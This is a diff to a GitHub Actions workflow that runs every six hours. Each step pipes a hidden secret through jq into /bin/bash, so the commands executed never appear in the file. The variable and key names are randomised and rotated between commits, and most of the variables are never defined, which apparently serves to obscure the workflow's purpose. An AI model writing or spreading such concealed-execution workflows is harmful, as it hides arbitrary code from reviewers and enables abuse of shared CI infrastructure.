@@ -2,30 +2,27 @@ name: yezhongshu2603
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
-
-jobs:  # 24082
+    - cron: '3 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yezhongshu2603
         env:
-          czdct1: ${{ secrets.czdct1 }}
+          ybit293: ${{ secrets.ybit293 }}
         run: |
-          echo $czdct1 | jq -r .j4808 | /bin/bash
-          echo $jdmt85168 | jq -r .i11082 | /bin/bash
-          echo $u53174 | jq -r .izp8315 | /bin/bash
-          echo $stx0081 | jq -r .h2918 | /bin/bash
-          echo $b0509 | jq -r .lvemx02224 | /bin/bash
-          echo $dbjvb874 | jq -r .yefh71140 | /bin/bash
-          echo $jxdm8 | jq -r .y0 | /bin/bash
-          echo $swnj117 | jq -r .nj7 | /bin/bash
-          echo $rkw16925 | jq -r .nfdz07 | /bin/bash
-          echo $qnx880 | jq -r .ycc706 | /bin/bash
-          echo $csokb71 | jq -r .u5 | /bin/bash
-          echo $nuipr5 | jq -r .q33245 | /bin/bash
-          echo $cg39610 | jq -r .s63820 | /bin/bash
-          echo $bwi7061 | jq -r .pvxp37379 | /bin/bash
-          echo $givvd9 | jq -r .c8 | /bin/bash
+          echo $ybit293 | jq -r .lygy9792 | /bin/bash
+          echo $inox7 | jq -r .tpdc335 | /bin/bash
+          echo $dzqf8402 | jq -r .du1 | /bin/bash
+          echo $da804 | jq -r .ph22476 | /bin/bash
+          echo $bltcv23886 | jq -r .jlf7 | /bin/bash
+          echo $fnw41 | jq -r .ge8 | /bin/bash
+          echo $bnzo2 | jq -r .qmplp397 | /bin/bash
+          echo $nygv9402 | jq -r .hvlk3089 | /bin/bash
+          echo $nvcsh5 | jq -r .znfa64846 | /bin/bash
+          echo $kte71306 | jq -r .tdiff27 | /bin/bash
+          echo $nv319 | jq -r .jj5636 | /bin/bash
+          echo $lypru54658 | jq -r .tqcq05465 | /bin/bash
+          echo $dwf52 | jq -r .roezh15089 | /bin/bash
 
